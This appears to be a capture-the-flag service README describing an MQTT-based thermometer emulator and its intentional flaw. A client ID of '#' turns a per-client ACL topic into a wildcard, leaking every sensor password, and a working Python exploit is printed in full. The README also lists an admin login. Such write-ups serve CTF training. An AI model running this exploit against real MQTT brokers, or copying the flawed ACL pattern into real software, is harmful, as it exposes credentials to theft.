# Thermometer service

## About

Thermometer service emulates smart temperature module. It consists of four elements: MQTT-broker, MySQL database, themperature sensor and web interface for management.

### MQTT broker

Docker image `thermometer/mqtt-broker` contains [Mosquitto](https://mosquitto.org/) MQTT broker.
As written on the [mosquitto.org](https://mosquitto.org/):
>Eclipse Mosquitto™ is an open source (EPL/EDL licensed) message broker that implements the MQTT protocol versions 3.1 and 3.1.1. MQTT provides a lightweight method of carrying out messaging using a publish/subscribe model. This makes it suitable for "Internet of Things" messaging such as with low power sensors or mobile devices such as phones, embedded computers or microcontrollers like the Arduino.

It supports client authentication (users + passwords) and authorization (acls). To store authentication and authorization information in MySQL Mosquitto uses [mosquitto-auth-plug](https://github.com/jpmens/mosquitto-auth-plug) authentication plugin. This information is stored in the `mqtt.users` and `mqtt.acls` tables.

`thermometer/mqtt-broker` docker image exposes 1883 tcp port outside. Sensor uses broker to send temperature data, client - to read data from sensors.

### MySQL

Docker image `thermometer/mqtt-db` wraps MySQL server. It contains single db (`mqtt`), two tables (`users` and `acls`) and two users (`mqtt_broker` and `thermometer_module`).
MQTT broker uses `mqtt_broker` user to read auth info from `mqtt-db` database.
Thermometer module uses `thermometer_module` user to add new MQTT users and acls for them.

### Termometer Sensor

Docker image `thermometer/sensor` contains an emulator of temperature sensor. It sends current (random) temperature to MQTT topic `house/temperature`.
To allow sensor to send temperature data, `admin` user should add MQTT authentication info for the sensor. He can do it via Termometer Module web interface.

After that sensor can publish temperature to `house/temperature` topic.

### Temperature Module

Docker image `thermometer/module` contains service to manage MQTT authentication and authorization.
It allows admin user (`admin:webrelay`) to:
* create MQTT user (`<sensor mqtt client id>:<auth token>`) and acl (permission to write to `house/temperature` topic) for sensor.
* create MQTT user (`<user name>:<password>`) and acl (permission to read from `house/temperature` topic) for temperature data consumer.

Module exposes HTTP port 8888 outside. 

## Vulnerabilities

### Read sensor authentication info

Thermometer module authorises sensor via MQTT: it sends MQTT password to topic `house/authorization/<sensor_mqtt_client_id>`.
To disallow to read other sensor password (flag) there is an acl rule in `mqtt.acls` table:

```
+----+--------------------+------------------------+----+
| id | username           | topic                  | rw |
+----+--------------------+------------------------+----+
| .. | ..                 | ..                     | .. |
|  2 | anonymous          | house/authorization/%c |  1 |
| .. | ..                 | ..                     | .. |
+----+--------------------+------------------------+----+
```

This rule expands `house/authorization/%c` to `house/authorization/<mqtt_client_id>`.

But if you pass `#` as `mqtt_client_id` you will get new MQTT passwords (flags) after subscribing to topic `house/authorization/#`.

Exploit:

```python
#!/usr/bin/env python3

import paho.mqtt.client as mqtt
import sys

def on_connect(client, userdata, flags, rc):
    print("Connected to MQTT broker.")
    client.subscribe("house/authorization/#")
    print("Subscribed to topic 'house/authorization/#'.")
    print("Waiting for flags...")

def on_message(client, userdata, msg):
    print(msg.payload)

def exploit(host):
    client = mqtt.Client(client_id="#", clean_session=True)
    client.on_connect = on_connect
    client.on_message = on_message

    print("Connecting to MQTT broker on %s" % host)
    client.connect(host, 1883, 60)
    client.loop_forever()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print('USAGE: %s <host>' % sys.argv[0])
        exit(-1)

    sys.exit(exploit(sys.argv[1]))
```
